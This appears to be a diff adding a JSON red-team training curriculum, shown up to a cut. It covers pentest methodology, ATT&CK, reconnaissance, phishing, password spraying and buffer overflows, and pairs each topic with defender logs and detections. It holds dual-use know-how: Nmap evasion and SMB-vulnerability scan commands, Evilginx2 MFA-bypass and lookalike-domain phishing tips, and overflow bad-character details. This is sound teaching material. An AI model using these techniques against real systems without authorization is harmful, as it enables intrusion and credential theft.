@@ -1,0 +1,1772 @@
+{
+  "track": "red-team",
+  "title": "Red Team — Offensive Security",
+  "description": "Comprehensive offensive security curriculum covering the full attack lifecycle from reconnaissance through impact, mapped to MITRE ATT&CK.",
+  "modules": [
+    {
+      "id": "foundations-and-methodology",
+      "title": "Foundations & Engagement Methodology",
+      "difficulty": "beginner",
+      "prerequisites": [],
+      "objective": "Plan and structure a penetration test engagement using industry-standard methodologies, legal frameworks, and the MITRE ATT&CK framework as a common language.",
+      "topics": [
+        {
+          "id": "pentest-methodology-standards",
+          "title": "Penetration Testing Standards & Methodologies",
+          "concepts": [
+            "PTES (Penetration Testing Execution Standard) seven phases: pre-engagement interactions, intelligence gathering, threat modeling, vulnerability analysis, exploitation, post-exploitation, reporting",
+            "NIST SP 800-115 four phases: planning, discovery, attack, reporting",
+            "OWASP Web Security Testing Guide (WSTG) checklist-based approach for web apps",
+            "OSSTMM (Open Source Security Testing Methodology Manual) for operational security metrics",
+            "Differences between vulnerability assessment, penetration test, and red team engagement"
+          ],
+          "key_facts": [
+            "PTES defines 7 engagement phases from pre-engagement through reporting",
+            "NIST SP 800-115 is the US federal government standard for security testing",
+            "A penetration test is point-in-time; red teaming is continuous adversarial simulation",
+            "Rules of Engagement (RoE) must define scope, timeline, and authorized targets before testing begins"
+          ],
+          "attack_techniques": [],
+          "killchain_stage": "reconnaissance",
+          "defense_pairing": {
+            "what_blue_sees": "Blue team should map all detected adversary activity back to a recognized methodology and ATT&CK technique IDs for standardized reporting and tracking.",
+            "logs": ["N/A — this is a planning/framework topic"],
+            "detections": ["MITRE ATT&CK Navigator for coverage mapping", "Threat-informed defense programs"],
+            "controls": ["Change management", "Authorization documents", "Scoping agreements"]
+          },
+          "drills": [
+            "Map a simulated attack scenario to all three methodology frameworks (PTES, NIST 800-115, OWASP WSTG) side by side",
+            "Draft a complete Rules of Engagement document for a hypothetical engagement covering scope, limitations, and escalation contacts"
+          ],
+          "common_mistakes": [
+            "Confusing penetration testing (finding vulnerabilities) with red teaming (simulating adversary TTPs)",
+            "Skipping pre-engagement interactions and starting testing without written authorization",
+            "Ignoring the threat modeling phase and testing everything rather than focusing on highest-risk assets"
+          ]
+        },
+        {
+          "id": "mitre-attack-framework",
+          "title": "MITRE ATT&CK Framework & Cyber Kill Chain",
+          "concepts": [
+            "ATT&CK Enterprise Matrix: 15 tactics (as of v19) — Reconnaissance (TA0043), Resource Development (TA0042), Initial Access (TA0001), Execution (TA0002), Persistence (TA0003), Privilege Escalation (TA0004), Defense Evasion/Stealth (TA0005), Defense Impairment (TA0112), Credential Access (TA0006), Discovery (TA0007), Lateral Movement (TA0008), Collection (TA0009), Command and Control (TA0011), Exfiltration (TA0010), Impact (TA0040)",
+            "Techniques vs sub-techniques: e.g., T1003 (OS Credential Dumping) has sub-techniques T1003.001 (LSASS), T1003.002 (SAM), T1003.003 (NTDS), T1003.006 (DCSync)",
+            "Lockheed Martin Cyber Kill Chain: 7 stages — Recon, Weaponize, Deliver, Exploit, Install, C2, Act on Objectives",
+            "ATT&CK as a common taxonomy linking red (offense), blue (detection), and purple (collaboration) teams"
+          ],
+          "key_facts": [
+            "ATT&CK v19 Enterprise contains 15 tactics, 200+ techniques, and 400+ sub-techniques",
+            "Each ATT&CK technique has a unique ID (e.g., T1558.003 = Kerberoasting)",
+            "ATT&CK Navigator visualizes coverage gaps between offensive techniques and defensive detections",
+            "The Cyber Kill Chain is a simpler 7-stage model; ATT&CK provides more granularity at each stage"
+          ],
+          "attack_techniques": [],
+          "killchain_stage": "reconnaissance",
+          "defense_pairing": {
+            "what_blue_sees": "Blue team uses ATT&CK as the lingua franca to classify detections, map coverage, and prioritize gaps. Every detection rule should map to one or more ATT&CK technique IDs.",
+            "logs": ["N/A — framework topic"],
+            "detections": ["ATT&CK Navigator coverage heatmaps", "ATT&CK Evaluations for vendor capability assessment"],
+            "controls": ["Threat-informed defense program", "ATT&CK-based purple team exercises"]
+          },
+          "drills": [
+            "Use the ATT&CK Navigator to map an APT group's known TTPs (e.g., APT29) to your organization's defensive coverage",
+            "Take a sample incident and map every observed action to a specific ATT&CK technique ID"
+          ],
+          "common_mistakes": [
+            "Treating ATT&CK as a checklist rather than a knowledge base of adversary behavior",
+            "Confusing tactics (the why) with techniques (the how)",
+            "Forgetting that many techniques span multiple tactics (e.g., Scheduled Tasks is both Execution and Persistence)"
+          ]
+        },
+        {
+          "id": "legal-and-ethical-frameworks",
+          "title": "Legal, Ethical & Compliance Frameworks",
+          "concepts": [
+            "Written authorization: scope of work (SoW), rules of engagement (RoE), and get-out-of-jail letters",
+            "US laws: Computer Fraud and Abuse Act (CFAA) 18 U.S.C. 1030, DMCA, state-specific breach notification laws",
+            "EU laws: GDPR Article 32 (security of processing), NIS2 Directive, UK Computer Misuse Act 1990",
+            "Compliance frameworks driving testing requirements: PCI DSS (req 11.3/11.4), SOC 2, ISO 27001, HIPAA Security Rule",
+            "Bug bounty vs authorized testing: scope, safe harbor, and coordinated vulnerability disclosure (CVD)"
+          ],
+          "key_facts": [
+            "CFAA 18 U.S.C. 1030 criminalizes unauthorized access to protected computers — always have written authorization",
+            "PCI DSS Requirement 11.3 requires annual penetration testing; 11.4 requires quarterly external vulnerability scans",
+            "SOC 2 Type II requires continuous security controls including regular penetration tests",
+            "Get-out-of-jail letter must list authorized testers, scope, and 24/7 emergency contacts"
+          ],
+          "attack_techniques": [],
+          "killchain_stage": "reconnaissance",
+          "defense_pairing": {
+            "what_blue_sees": "Security teams must verify that detected suspicious activity during the engagement window corresponds to authorized testers, not real threats.",
+            "logs": ["Activity logs with engagement timestamps", "Change tickets referencing RoE"],
+            "detections": ["Engagement calendar correlation rules", "Tester IP allowlist monitoring"],
+            "controls": ["Written authorization", "Scope documentation", "Emergency contact list", "Insurance coverage"]
+          },
+          "drills": [
+            "Draft a complete authorization document including SoW, RoE, scope limitations, and notification procedures for a web app pentest",
+            "Identify which compliance frameworks would require penetration testing for a hypothetical healthcare SaaS company"
+          ],
+          "common_mistakes": [
+            "Testing systems outside of the agreed scope, even if they are in the same network range",
+            "Not obtaining written, signed authorization before any testing — verbal authorization is insufficient",
+            "Failing to maintain an audit trail of all activities performed during the engagement"
+          ]
+        },
+        {
+          "id": "lab-environment-and-tooling",
+          "title": "Lab Environment & Essential Tooling",
+          "concepts": [
+            "Virtual lab setup: Kali Linux / Parrot OS as attack platform, Windows VMs as targets, Active Directory lab with Domain Controller",
+            "Essential tools by phase: Nmap (scanning), Burp Suite (web), Metasploit (exploitation), BloodHound (AD mapping), Mimikatz (credentials), Wireshark (network analysis)",
+            "GOAD (Game Of Active Directory) and HackTheBox/Proving Grounds for realistic practice environments",
+            "C2 frameworks: Cobalt Strike, Sliver, Mythic, Havoc — for emulating adversary command and control"
+          ],
+          "key_facts": [
+            "Kali Linux includes 600+ pre-installed security tools",
+            "GOAD provides a purposefully vulnerable multi-forest Active Directory lab",
+            "BloodHound + SharpHound collector maps AD attack paths as a graph database",
+            "Wireshark supports 2,000+ network protocols for deep packet inspection"
+          ],
+          "attack_techniques": [],
+          "killchain_stage": "reconnaissance",
+          "defense_pairing": {
+            "what_blue_sees": "Lab tooling mirrors real-world adversary tools — defenders must detect these exact tools in production (e.g., Mimikatz signatures, BloodHound LDAP queries, Cobalt Strike beacon patterns).",
+            "logs": ["Sysmon Event 1 (process creation for known tools)", "DNS logs for C2 domains", "Windows Event 4688 (process auditing)"],
+            "detections": ["YARA rules for known tool signatures", "Sigma rules for Mimikatz process patterns", "EDR signatures for Cobalt Strike beacons"],
+            "controls": ["EDR", "Application allowlisting", "Network segmentation in lab environments"]
+          },
+          "drills": [
+            "Build a GOAD lab and enumerate the domain using BloodHound, finding at least one path to Domain Admin",
+            "Set up a Splunk or Elastic SIEM in the lab and ingest Windows Security + Sysmon logs from target VMs"
+          ],
+          "common_mistakes": [
+            "Not building detection infrastructure in the lab — you should see what blue team sees while you attack",
+            "Using outdated tool versions that may have been patched or detected by modern EDR",
+            "Testing only against intentionally vulnerable apps (DVWA) without practicing against realistic environments"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "reconnaissance-and-osint",
+      "title": "Reconnaissance & Open Source Intelligence",
+      "difficulty": "beginner",
+      "prerequisites": ["foundations-and-methodology"],
+      "objective": "Perform passive and active reconnaissance to gather actionable intelligence about a target organization, including OSINT, network scanning, service enumeration, and vulnerability identification.",
+      "topics": [
+        {
+          "id": "passive-osint",
+          "title": "Passive Reconnaissance & OSINT",
+          "concepts": [
+            "OSINT (Open Source Intelligence): gathering publicly available information without touching the target's infrastructure",
+            "Subdomain enumeration: Amass, Subfinder, certificate transparency logs (crt.sh), DNS brute-forcing",
+            "Social media and employee recon: LinkedIn, GitHub (for leaked credentials/keys), job postings revealing tech stack",
+            "DNS reconnaissance: zone transfers, reverse DNS, DNS record analysis (MX, TXT, SRV, SPF)",
+            "Shodan and Censys for internet-connected device discovery and exposed service identification"
+          ],
+          "key_facts": [
+            "Certificate Transparency logs (crt.sh) reveal all SSL certificates issued for a domain — exposing subdomains",
+            "Shodan indexes billions of internet-connected devices and can find exposed services without scanning",
+            "GitHub dorking can find hardcoded API keys, passwords, and connection strings in public repositories",
+            "WHOIS data reveals domain registration details, nameservers, and historical ownership",
+            "theHarvester aggregates emails, subdomains, hosts, and employee names from 20+ public sources"
+          ],
+          "attack_techniques": ["T1592", "T1592.002", "T1592.004", "T1589", "T1590", "T1590.002"],
+          "killchain_stage": "reconnaissance",
+          "defense_pairing": {
+            "what_blue_sees": "Pure passive recon generates NO logs on the target — this is why it is so dangerous. Blue team relies on external attack surface management (EASM) tools and digital footprint monitoring to discover what attackers can find.",
+            "logs": ["N/A — passive recon does not touch target systems", "External EASM scan results"],
+            "detections": ["Digital footprint monitoring (e.g., Shodan alerts)", "GitHub secret scanning", "Certificate transparency monitoring for unauthorized certs"],
+            "controls": ["Attack Surface Management (ASM) platform", "DNS monitoring", "Secret scanning in CI/CD", "Employee security awareness training"]
+          },
+          "drills": [
+            "Use crt.sh and Amass to enumerate all subdomains for a target organization and identify forgotten/dev subdomains",
+            "Perform GitHub dorking to find leaked credentials related to a target organization using GitDorker or truffleHog"
+          ],
+          "common_mistakes": [
+            "Jumping straight to active scanning without performing thorough OSINT first",
+            "Ignoring job postings and LinkedIn profiles that reveal internal technology stack",
+            "Not documenting OSINT findings systematically — intelligence must be organized and actionable"
+          ]
+        },
+        {
+          "id": "active-network-scanning",
+          "title": "Active Network Scanning with Nmap",
+          "concepts": [
+            "TCP SYN scan (-sS): half-open scan that sends SYN but does not complete handshake — default and stealthiest",
+            "TCP connect scan (-sT): full TCP handshake — used when raw sockets are unavailable",
+            "Service version detection (-sV): probes open ports to identify service and version via nmap-service-probes database",
+            "OS fingerprinting (-O): sends crafted TCP/UDP/ICMP packets and analyzes responses against nmap-os-db signatures",
+            "Nmap Scripting Engine (NSE): --script flag for vulnerability detection, brute force, and advanced enumeration",
+            "Timing and evasion: -T0 through -T5 timing templates, fragment packets (-f), decoy scans (-D), idle scans (-sI)"
+          ],
+          "key_facts": [
+            "SYN scan (-sS) is the default and most popular Nmap scan — faster and stealthier than connect scan",
+            "Common port targets: 21 (FTP), 22 (SSH), 23 (Telnet), 25 (SMTP), 53 (DNS), 80 (HTTP), 88 (Kerberos), 110 (POP3), 135 (MSRPC), 139 (NetBIOS), 143 (IMAP), 389 (LDAP), 443 (HTTPS), 445 (SMB), 1433 (MSSQL), 3306 (MySQL), 3389 (RDP), 5432 (PostgreSQL), 5985 (WinRM HTTP), 5986 (WinRM HTTPS)",
+            "Nmap timing -T0 (paranoid, ~5 min per probe) to -T5 (insane, aggressive); -T3 is default",
+            "NSE scripts are categorized: default, brute, exploit, vuln, auth, discovery, safe, intrusive",
+            "UDP scan (-sU) is slow because ICMP port unreachable responses are rate-limited by OS"
+          ],
+          "attack_techniques": ["T1595", "T1595.001", "T1595.002", "T1046"],
+          "killchain_stage": "reconnaissance",
+          "defense_pairing": {
+            "what_blue_sees": "Active scanning is extremely noisy — IDS/IPS will detect SYN scans, port sweeps, and version probing. Nmap activity appears as rapid connection attempts across many ports from a single source IP.",
+            "logs": ["Firewall logs (connection attempts)", "IDS/IPS alerts (Snort/Suricata)", "Network flow logs (NetFlow/Zeek)"],
+            "detections": ["Snort port scan preprocessor rules", "Suricata scan detection", "Sigma rules for rapid connection patterns", "Zeek scan detection scripts"],
+            "controls": ["IDS/IPS (Snort, Suricata)", "Network firewalls", "Rate limiting", "Honeypots/honeynets"]
+          },
+          "drills": [
+            "Perform a full port SYN scan with version detection and OS fingerprinting on a lab target: nmap -sS -sV -O -p- <target>",
+            "Use NSE scripts to enumerate SMB shares and detect known vulnerabilities: nmap --script smb-enum-shares,smb-vuln* -p 445 <target>",
+            "Practice stealth scanning with timing evasion: nmap -sS -T2 -f --max-retries 1 --data-length 24 <target>"
+          ],
+          "common_mistakes": [
+            "Scanning with default -T4 timing on sensitive production networks — use -T1 or -T2 for stealth",
+            "Only scanning top 1000 ports and missing services on non-standard ports — use -p- for full port scan",
+            "Not saving scan output: always use -oN (normal), -oX (XML), or -oA (all formats) for documentation"
+          ]
+        },
+        {
+          "id": "service-enumeration",
+          "title": "Service & Protocol Enumeration",
+          "concepts": [
+            "SMB enumeration: smbclient, enum4linux, CrackMapExec (NetExec) — list shares, users, password policy, sessions",
+            "Web enumeration: directory brute-forcing with Gobuster/ffuf/Feroxbuster, technology fingerprinting with Wappalyzer/WhatWeb",
+            "LDAP enumeration: ldapsearch, windapsearch — enumerate AD users, groups, computers from port 389/636",
+            "SNMP enumeration: snmpwalk, onesixtyone — extract system info, running processes, software from port 161 UDP",
+            "RPC enumeration: rpcclient — enumerate users, groups, and shares via MSRPC on port 135",
+            "SMTP enumeration: smtp-user-enum — verify email addresses and enumerate users via VRFY/EXPN commands"
+          ],
+          "key_facts": [
+            "SMB runs on port 445 (and legacy 139 for NetBIOS) — enum4linux-ng automates SMB/RPC/LDAP enumeration",
+            "CrackMapExec (now NetExec) is a swiss army knife for Windows network attacks: smb, mssql, winrm, ldap protocols",
+            "SNMP community string 'public' (read-only) and 'private' (read-write) are default and often unchanged",
+            "LDAP queries to Global Catalog run on port 3268 (3269 for LDAPS) — useful for cross-domain enumeration",
+            "Gobuster/ffuf wordlists: SecLists provides curated directory, username, and password lists"
+          ],
+          "attack_techniques": ["T1046", "T1087", "T1087.002", "T1018", "T1082", "T1135", "T1069"],
+          "killchain_stage": "reconnaissance",
+          "defense_pairing": {
+            "what_blue_sees": "Enumeration generates many rapid queries — SMB session enumerations create Event 4624 (type 3, network logon), LDAP queries are logged, and directory brute-forcing shows as high-volume HTTP 404 responses.",
+            "logs": ["Windows Event 4624 (network logon type 3)", "Windows Event 4662 (object access on AD objects)", "IIS/Apache access logs (HTTP 404 bursts)", "Sysmon Event 3 (network connections to enumeration tools)"],
+            "detections": ["Sigma: excessive network share connections", "Sigma: anomalous LDAP query patterns", "WAF rules for directory brute-forcing", "AD audit logging for unusual query volume"],
+            "controls": ["IDS/IPS", "AD audit policy (Account Management, DS Access)", "WAF rate limiting", "SMB signing requirements"]
+          },
+          "drills": [
+            "Use enum4linux-ng and CrackMapExec to enumerate a Windows domain controller's users, shares, and password policy",
+            "Run Gobuster against a web server with a common wordlist and identify hidden directories: gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt",
+            "Enumerate SNMP on a network device using snmpwalk with the community string 'public'"
+          ],
+          "common_mistakes": [
+            "Skipping service enumeration and jumping to exploitation without understanding the target environment",
+            "Not trying null sessions (anonymous SMB/LDAP access) before attempting authentication",
+            "Forgetting to enumerate SNMP — it often reveals software versions, routing tables, and ARP caches"
+          ]
+        },
+        {
+          "id": "vulnerability-identification",
+          "title": "Vulnerability Identification & Scanning",
+          "concepts": [
+            "Vulnerability scanners: Nessus, OpenVAS/Greenbone, Qualys, Nuclei — automated CVE detection",
+            "Web vulnerability scanners: Burp Suite Professional (active scan), OWASP ZAP, Acunetix",
+            "Nessus scan types: Basic Network Scan, Advanced Scan, Credentialed Patch Audit, Web Application Tests",
+            "Credentialed vs non-credentialed scanning: credentialed provides deeper results by authenticating to the target",
+            "Manual validation: verifying scanner findings to eliminate false positives before exploitation"
+          ],
+          "key_facts": [
+            "Nessus is the industry-standard vulnerability scanner with 180,000+ plugins",
+            "Nuclei is an open-source, template-based scanner with 8,000+ community templates for CVEs and misconfigurations",
+            "Credentialed scans find 3-5x more vulnerabilities than non-credentialed scans",
+            "Common false positives: scanner reports outdated version based on banner, but the system has backported patches",
+            "CVSS v3.1 scores range from 0.0 (None) to 10.0 (Critical) — base score considers attack vector, complexity, privileges, and impact"
+          ],
+          "attack_techniques": ["T1595.002", "T1580", "T1595.001"],
+          "killchain_stage": "reconnaissance",
+          "defense_pairing": {
+            "what_blue_sees": "Vulnerability scanners are noisy and generate patterns similar to attack tools. Blue team should distinguish authorized scanning from adversarial scanning by correlating with change tickets.",
+            "logs": ["Firewall/IPS logs (port scanning patterns)", "Web server logs (scanner user-agents like Nessus, Nikto)", "Windows Event 4625 (failed logins from brute-force scan)"],
+            "detections": ["IPS signatures for known scanner behavior", "WAF rules detecting scanner fingerprints", "Sigma: unusual scan activity from unauthorized IPs"],
+            "controls": ["IPS/IDS", "Vulnerability management program", "Patch management", "Network segmentation"]
+          },
+          "drills": [
+            "Run a Nessus or OpenVAS credentialed scan against a lab Windows host and document all Critical and High findings",
+            "Use Nuclei to scan a web application for known CVEs: nuclei -u http://target -t cves/",
+            "Manually validate 3 scanner findings to confirm they are true positives, not false positives"
+          ],
+          "common_mistakes": [
+            "Trusting scanner output blindly without manual validation — scanners produce false positives",
+            "Only running non-credentialed scans and missing authenticated vulnerabilities",
+            "Not credentialed scanning domain-joined systems which reveals much more patch and configuration data"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "initial-access-and-social-engineering",
+      "title": "Initial Access & Social Engineering",
+      "difficulty": "intermediate",
+      "prerequisites": ["reconnaissance-and-osint"],
+      "objective": "Gain initial foothold access to target environments through application exploitation, phishing campaigns, supply chain compromise, and social engineering.",
+      "topics": [
+        {
+          "id": "exploit-public-facing-apps",
+          "title": "Exploiting Public-Facing Applications",
+          "concepts": [
+            "Identifying and exploiting CVEs in internet-facing services: web servers, VPN gateways, mail servers, RDP",
+            "Common exploit vectors: Log4Shell (CVE-2021-44228), ProxyLogon (CVE-2021-26855), Citrix Bleed (CVE-2023-4966), Confluence RCE (CVE-2022-26134)",
+            "Using searchsploit and Exploit-DB to find public exploits for identified software versions",
+            "Metasploit modules for common public-facing service exploits"
+          ],
+          "key_facts": [
+            "Log4Shell (CVE-2021-44228) allows RCE via JNDI injection in any application using vulnerable Log4j — affected millions of systems",
+            "ProxyLogon (CVE-2021-26855) chain allowed unauthenticated RCE on Microsoft Exchange — patched March 2021",
+            "searchsploit is the local CLI for Exploit-DB with 40,000+ exploits searchable by name or CVE",
+            "Metasploit has 2,000+ exploit modules; use 'search' command to find modules by CVE or service name"
+          ],
+          "attack_techniques": ["T1190"],
+          "killchain_stage": "initial-access",
+          "defense_pairing": {
+            "what_blue_sees": "Exploitation of public-facing apps creates anomalous web traffic patterns, unusual processes spawned by web services (e.g., w3wp.exe spawning cmd.exe), and potential reverse shell connections to unknown IPs.",
+            "logs": ["Web server access logs (unusual requests, error patterns)", "Windows Event 4688 (process creation by web service accounts)", "Sysmon Event 1 (suspicious child processes of web services)", "Firewall logs (outbound connections from web servers)"],
+            "detections": ["WAF rules for known exploit signatures (Log4Shell JNDI patterns)", "Sigma: web server spawning shell processes", "EDR: suspicious process ancestry (w3wp.exe -> cmd.exe -> powershell.exe)", "Suricata/Snort IDS exploit signatures"],
+            "controls": ["WAF", "IDS/IPS", "Patch management", "Network segmentation (DMZ)", "EDR"]
+          },
+          "drills": [
+            "Search Exploit-DB for exploits matching a target software version and identify applicable modules",
+            "In a lab environment, exploit a vulnerable service using a Metasploit module and observe what logs appear on the target"
+          ],
+          "common_mistakes": [
+            "Using exploits without understanding the vulnerability — this leads to failed exploitation and potential system crashes",
+            "Not checking if the target has already been patched before attempting exploitation",
+            "Forgetting to set the correct LHOST and LPORT in Metasploit, causing the reverse shell to fail"
+          ]
+        },
+        {
+          "id": "phishing-and-spearphishing",
+          "title": "Phishing & Spearphishing Campaigns",
+          "concepts": [
+            "Phishing infrastructure: domains (registered or subdomained), email sending (GoPhish, King Phisher), payload hosting",
+            "Payload types: malicious Office macros, HTA files, LNK files, ISO/IMG attachments to bypass Mark-of-the-Web (MotW)",
+            "Credential harvesting: cloned login pages with Evilginx2 (for MFA bypass via reverse proxy), GoPhish landing pages",
+            "Spearphishing vs bulk phishing: targeted emails using OSINT-gathered information about specific individuals",
+            "Payload delivery evasion: encrypted archives, password-protected ZIPs, steganography, one-note files"
+          ],
+          "key_facts": [
+            "GoPhish is the industry-standard open-source phishing simulation framework with campaign tracking and templates",
+            "Evilginx2 performs adversary-in-the-middle phishing that bypasses MFA by proxying the real login page and capturing session cookies",
+            "Mark-of-the-Web (MotW) is a Zone.Identifier alternate data stream on downloaded files — ISO/IMG containers bypass it",
+            "Microsoft disabled macros by default in Office documents downloaded from the internet (2022) — attackers pivoted to ISO/LNK/HTA payloads"
+          ],
+          "attack_techniques": ["T1566", "T1566.001", "T1566.002", "T1566.003", "T1566.004"],
+          "killchain_stage": "initial-access",
+          "defense_pairing": {
+            "what_blue_sees": "Phishing payloads trigger email security gateway alerts, EDR detections on macro execution, and DNS logs for credential harvesting domains. Blue team sees: suspicious email sender patterns, attachments flagged by sandboxing, unexpected process launches from Office apps.",
+            "logs": ["Email gateway logs (spam/phish detections)", "Sysmon Event 1 (Office app spawning child processes)", "Sysmon Event 3 (network connections from Office apps)", "Sysmon Event 22 (DNS queries to suspicious domains)", "Proxy logs (credential harvesting page access)"],
+            "detections": ["Sigma: Office applications spawning cmd/powershell", "EDR macro execution detection", "DMARC/SPF/DKIM email authentication failures", "URL reputation scoring", "Sandbox detonation of email attachments"],
+            "controls": ["Email security gateway (Proofpoint, Mimecast)", "EDR", "MFA (note: Evilginx2 bypasses MFA via session cookies)", "Macro security (block macros from internet)", "Security awareness training", "DMARC/SPF/DKIM"]
+          },
+          "drills": [
+            "Set up a GoPhish campaign with a credential harvesting landing page and send a simulated phishing email to lab accounts",
+            "Create a macro-enabled payload that executes a calc.exe beacon and observe which EDR detections fire",
+            "Use Evilginx2 in a lab to demonstrate MFA bypass via reverse proxy phishing"
+          ],
+          "common_mistakes": [
+            "Using obvious phishing domains that are immediately caught by email security — use lookalike domains with valid TLDs",
+            "Forgetting to handle Mark-of-the-Web (MotW) — payloads blocked by SmartScreen or macro security",
+            "Not prepping payload infrastructure (domains, SSL certs, redirectors) before sending the campaign"
+          ]
+        },
+        {
+          "id": "valid-accounts-and-external-access",
+          "title": "Valid Accounts & External Remote Services",
+          "concepts": [
+            "Credential reuse: using leaked/breached credentials (HaveIBeenPwned, DeHashed) to access corporate VPN, O365, or RDP",
+            "Password spraying: trying one common password against many accounts to avoid lockout thresholds",
+            "External remote services exploitation: VPN (SSL/IPsec), RDP (3389), SSH (22), WinRM (5985/5986), OWA, Citrix",
+            "MFA fatigue/bombing: repeatedly sending MFA push notifications until the user approves one",
+            "OAuth token abuse and consent phishing: tricking users into granting malicious OAuth app permissions"
+          ],
+          "key_facts": [
+            "Password spraying typically uses 1-3 attempts per account to stay under lockout thresholds (commonly 5-10 attempts)",
+            "VPN endpoints and RDP (3389) are the most commonly brute-forced external services",
+            "MFA fatigue attacks were used in the Uber breach (2022) — attacker spammed MFA pushes until approval",
+            "Azure AD / Entra ID sign-in logs can be monitored for impossible travel and unusual IP geolocation",
+            "OAuth consent phishing does not require credentials — users voluntarily grant app permissions"
+          ],
+          "attack_techniques": ["T1078", "T1078.002", "T1078.003", "T1078.004", "T1110", "T1110.003", "T1133"],
+          "killchain_stage": "initial-access",
+          "defense_pairing": {
+            "what_blue_sees": "Valid account usage appears as legitimate logins — detection requires behavioral baselining. Blue team looks for: logins from new geolocations, impossible travel, unusual hours, MFA push fatigue patterns, and password spray patterns (same password, many users, one attempt each).",
+            "logs": ["Windows Event 4624 (successful logon — analyze Logon Type, Source Network Address)", "Windows Event 4625 (failed logon — password spray pattern)", "Azure AD sign-in logs", "VPN authentication logs", "RDP logs (Event 4624 Logon Type 10 or 7)"],
+            "detections": ["Sigma: multiple 4625 failures from same source followed by 4624 success", "UEBA: impossible travel detection", "Azure AD Conditional Access risk-based policies", "Sigma: MFA push fatigue (multiple MFA challenges in short window)"],
+            "controls": ["MFA (phishing-resistant: FIDO2/hardware keys)", "Account lockout policy", "Conditional Access policies", "Passwordless authentication", "Privileged Access Management (PAM)"]
+          },
+          "drills": [
+            "Perform a password spray against a lab VPN using a common password list and observe lockout behavior",
+            "Analyze Windows Event 4624/4625 logs to identify a password spraying pattern in SIEM"
+          ],
+          "common_mistakes": [
+            "Password spraying too aggressively and triggering account lockouts — use realistic timing delays",
+            "Not checking for MFA before attempting credential-based attacks",
+            "Forgetting that VPN/RDP logins from unusual locations may trigger conditional access blocks"
+          ]
+        },
+        {
+          "id": "supply-chain-compromise",
+          "title": "Supply Chain Compromise",
+          "concepts": [
+            "Software supply chain: compromising a vendor's build pipeline to inject malicious code into legitimate software updates",
+            "Historical cases: SolarWinds (SUNBURST, 2020), Kaseya VSA (REvil, 2021), 3CX (2023), XZ Utils backdoor (CVE-2024-3094, 2024)",
+            "Open source dependency attacks: malicious npm/PyPI packages (typosquatting), dependency confusion",
+            "Hardware supply chain: compromised firmware or devices inserted into the supply chain before delivery"
+          ],
+          "key_facts": [
+            "SolarWinds SUNBURST affected ~18,000 organizations including US government agencies via a trojanized Orion update",
+            "The XZ Utils backdoor (CVE-2024-3094) was a nearly successful supply chain attack on SSH servers in Linux distributions",
+            "Dependency confusion attacks exploit package managers by publishing a package with the same name as an internal/private package to a public registry",
+            "NIST SSDF (Secure Software Development Framework) SP 800-218 defines practices for preventing supply chain attacks"
+          ],
+          "attack_techniques": ["T1195", "T1195.001", "T1195.002", "T1195.003", "T1199"],
+          "killchain_stage": "initial-access",
+          "defense_pairing": {
+            "what_blue_sees": "Supply chain compromise is extremely difficult to detect — the malicious code arrives as a trusted update. Blue team must rely on behavioral detection of post-compromise activity, software bill of materials (SBOM) verification, and code signing validation.",
+            "logs": ["Software update logs", "Application execution logs (Sysmon Event 1)", "Network connections from trusted software (Sysmon Event 3)", "DNS/HTTP logs for C2 callbacks from trojanized software"],
+            "detections": ["Behavioral analytics for trusted software making unusual network connections", "Code signing certificate validation", "SBOM comparison and verification", "EDR behavioral rules for trusted process anomalies"],
+            "controls": ["Software Bill of Materials (SBOM)", "Code signing verification", "Application allowlisting", "Network segmentation", "Vendor security assessments", "SLSA framework compliance"]
+          },
+          "drills": [
+            "Analyze the SolarWinds SUNBURST attack timeline and map each step to ATT&CK technique IDs",
+            "Set up a dependency confusion scenario in a lab and demonstrate how a public package can shadow an internal one"
+          ],
+          "common_mistakes": [
+            "Trusting software updates implicitly — updates from legitimate vendors can be compromised",
+            "Not maintaining an SBOM — you cannot detect what you do not know is installed",
+            "Ignoring the risk of third-party dependencies in custom applications"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "exploitation-fundamentals",
+      "title": "Exploitation Fundamentals & Binary Exploitation",
+      "difficulty": "intermediate",
+      "prerequisites": ["reconnaissance-and-osint", "initial-access-and-social-engineering"],
+      "objective": "Develop and execute exploits against vulnerable software, understanding memory corruption, exploit mitigations, and the Metasploit Framework.",
+      "topics": [
+        {
+          "id": "stack-buffer-overflow",
+          "title": "Stack-Based Buffer Overflows",
+          "concepts": [
+            "Memory layout: stack grows downward — local variables, saved frame pointer (EBP/RBP), return address (EIP/RIP)",
+            "Buffer overflow mechanics: writing past buffer boundary overwrites saved EBP and return address",
+            "Controlling EIP: overwriting return address with pointer to shellcode or a JMP ESP gadget",
+            "Bad characters: bytes that terminate strings (0x00 null, 0x0a newline, 0x0d carriage return) cannot be in shellcode",
+            "Offset calculation: using pattern_create/pattern_offset to find exact bytes to reach EIP"
+          ],
+          "key_facts": [
+            "x86 stack grows downward (high to low memory addresses); overflow writes upward toward saved EIP",
+            "Metasploit pattern_create.rb generates a unique pattern to find the exact EIP offset",
+            "Common bad characters: \\x00 (null), \\x0a (newline), \\x0d (carriage return), \\xff",
+            "JMP ESP (0xFFE4) gadget redirects execution to shellcode placed after the return address on the stack",
+            "Stack-based overflows are mitigated by stack canaries (/GS), DEP/NX (non-executable stack), and ASLR"
+          ],
+          "attack_techniques": ["T1203", "T1055", "T1068"],
+          "killchain_stage": "execution",
+          "defense_pairing": {
+            "what_blue_sees": "Successful buffer overflow exploitation results in arbitrary code execution within the vulnerable process. Blue team sees: application crashes (WER logs), unexpected child processes, and network connections from the exploited application.",
+            "logs": ["Windows Error Reporting logs (application crashes)", "Sysmon Event 1 (new process from exploited application)", "Sysmon Event 3 (network connection from exploited process)", "Application crash dumps"],
+            "detections": ["EDR exploit protection (DEP, ASLR enforcement)", "Sigma: application spawning unexpected child processes", "Application crash pattern monitoring"],
+            "controls": ["DEP/NX (Data Execution Prevention)", "ASLR (Address Space Layout Randomization)", "Stack canaries (/GS compiler flag)", "Control Flow Guard (CFG)", "EDR with exploit protection"]
+          },
+          "drills": [
+            "Exploit a simple vulnerable buffer overflow program (e.g., vulnserver TRUN command) to gain remote code execution",
+            "Use Immunity Debugger or x64dbg with Mona.py to find bad characters and a JMP ESP gadget for exploitation",
+            "Calculate the EIP offset using Metasploit pattern_create and pattern_offset tools"
+          ],
+          "common_mistakes": [
+            "Not identifying all bad characters before generating shellcode — payload will be truncated",
+            "Using shellcode with null bytes (\\x00) in a string-copy overflow — the copy stops at null",
